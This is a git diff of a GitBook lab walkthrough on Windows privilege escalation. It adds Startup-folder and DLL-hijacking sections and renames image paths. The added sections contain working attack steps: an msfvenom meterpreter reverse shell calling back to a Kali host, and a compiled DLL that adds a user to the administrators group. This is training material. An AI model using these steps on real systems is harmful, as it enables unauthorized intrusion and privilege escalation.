@@ -171,7 +171,7 @@ C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
 2\. In Autoruns, click on the ‘Logon’ tab.\
 3\. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 4\. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
@@ -184,7 +184,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 
 5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -255,12 +255,12 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 
 1\. Wait for a new session to open in Metasploit.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
 3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -278,7 +278,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 2.From the output, notice that “AlwaysInstallElevated” value is 1.\
 3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
@@ -289,7 +289,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 4.From the output, notice that “AlwaysInstallElevated” value is 1.
 
@@ -371,7 +371,7 @@ sessions -i 1
 getuid
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Registry
 
@@ -388,7 +388,7 @@ getuid
 Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -503,11 +503,11 @@ subl windows_service.c
 
 **From**
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 **To**
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 2\. Exit the text editor and compile the file by typing the following in the command prompt: x86\_64-w64-mingw32-gcc windows\_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')&#x20;
@@ -558,7 +558,7 @@ sc start regsvc
 net localgroup administrators 
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Executable Files
 
@@ -577,7 +577,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Fil
 \
 2\. Notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the filepermservice.exe file.
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -587,9 +587,8 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Fil
 
 **Victim**
 
-```
-copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
-```
+<pre><code><strong>copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+</strong></code></pre>
 
 2\. In command prompt type: sc start filepermsvc
 
@@ -608,21 +607,208 @@ sc start filepermsvc
 net localgroup administrators
 ```
 
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - Startup Applications
+
+### Detection 
+
+**Windows VM**
+
+1\. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+**Victim**
+
+```
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+\
+2\. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+**Kali VM**
+
+1\. Open command prompt and type: msfconsole
+
+**Kali**
+
+```
+msfconsole
+```
+
+\
+2\. In Metasploit (msf > prompt) type: use multi/handler\
+3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp\
+4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]\
+5\. In Metasploit (msf > prompt) type: run
+
+**Kali(msfconsole)**
+
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost $KALI
+run
+```
+
+\
+6\. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp LHOST=\[Kali VM IP Address] -f exe -o x.exe\
+7\. Copy the generated file, x.exe, to the Windows VM.
+
+Windows VM
+
+1\. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.\
+2\. Logoff.
+
+**Victim**
+
+```
+copy \\tsclient\kali\x.exe "C:\Temp\x.exe" 
+copy /y c:\Temp\x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+shutdown /l
+```
+
+\
+3\. Login with the administrator account credentials.
+
+**Kali**
+
+```
+xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568 /drive:kali,/root/
+```
+
+**Kali VM**
+
+1\. Wait for a session to be created, it may take a few seconds.\
+2\. In Meterpreter(meterpreter > prompt) type: getuid\
+3\. From the output, notice the user is “User-PC\Admin”
+
+**Kali(msfconsole)**
+
+```
+getuid
+```
+
 <figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+## Service Escalation - DLL Hijacking
+
+### Detection
+
+**Windows VM**
+
+1\. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.\
+2\. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+3\. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.\
+4\. In the input box on the same line type: dllhijackservice.exe
+
+\
+5\. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.\
+
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+6\. Next, select from the left-most drop down menu ‘Result’.\
+
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+7\. In the input box on the same line type: NAME NOT FOUND\
+8\. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+\
+9\. Open command prompt and type: sc start dllsvc
+
+**Victim**
+
+```
+sc start dllsvc
+```
+
+\
+10\. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+**Windows VM**
+
+1\. Copy ‘C:\Users\User\Desktop\Tools\Source\windows\_dll.c’ to the Kali VM.
+
+**Victim**
+
+```
+copy "C:\Users\User\Desktop\Tools\Source\windows_dll.c" \\tsclient\kali\ 
+```
 
 
 
+**Kali VM**
+
+1\. Open windows\_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
+
+**Kali**
+
+```
+subl windows_dll.c
+```
+
+**From**
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**To**
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 
 
+2\. Exit the text editor and compile the file by typing the following in the command prompt: x86\_64-w64-mingw32-gcc windows\_dll.c -shared -o hijackme.dll\
 
 
+**Kali**
 
+```
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+```
 
+3\. Copy the generated file hijackme.dll, to the Windows VM.
 
+**Victim**
 
+```
+copy \\tsclient\kali\hijackme.dll  "C:\Temp\hijackme.dll"
+```
 
+\
+1\. Open command prompt and type: sc stop dllsvc & sc start dllsvc
+
+**Victim**
+
+```
+sc stop dllsvc & sc start dllsvc
+```
+
+\
+2\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+**Victim**
+
+```
+net localgroup administrators
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 
 
